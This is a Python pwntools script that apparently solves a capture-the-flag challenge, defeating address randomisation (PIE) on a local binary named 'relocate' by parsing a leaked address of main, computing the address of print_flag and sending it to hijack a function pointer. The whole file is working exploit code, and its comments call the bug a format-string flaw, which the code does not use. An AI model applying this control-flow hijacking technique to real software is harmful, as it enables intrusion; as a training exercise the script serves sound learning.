from pwn import *

# we need to calculate the memory offset the functions use
# we can take the addresses of our given function "main"
# and subtract it from the address of the target function
# to get the offset of where the function is stored in memory
def find_pie_offset(target_func):
    elf = ELF("./relocate")
    main_addr = elf.functions['main'].address
    target_addr = elf.functions[target_func].address
    addr_diff = main_addr - target_addr
    info(f"Address Difference: {addr_diff}")
    return addr_diff

# using the offset we can during runtime take the given address
# of main and substract the diff to get the address of the target
# function we want to execute, using the scanf function in the C
# program we can perform a string format vuln, where later we can
# set the void function pointer to point to the target function we
# want to execute, printing the flag
def attack_pie(target_function, addr_diff):
    p = process("./relocate")
    p.recvuntil(b'Welcome to ')
   
    # parse the extra bits from the string before
    # converting the address into an integer of base 16 
    blob = p.recvuntil(b' I will').decode()
    blob = blob.replace(' I will', '')

    info(f"Parsed Address: {blob}")

    # find the address of the target function on run-time
    main_addr = int(blob, base=16)
    target_addr = main_addr - addr_diff
    info(f"{target_function}: {addr_diff}")

    # send the payload to execute the target function
    p.recvuntil(b'address?')
    p.sendline(hex(target_addr).encode())
    info(p.recvall()) # display the flag

def main():
    addr_diff = find_pie_offset("print_flag")
    attack_pie("print_flag", addr_diff)

if __name__ == "__main__":
    main()
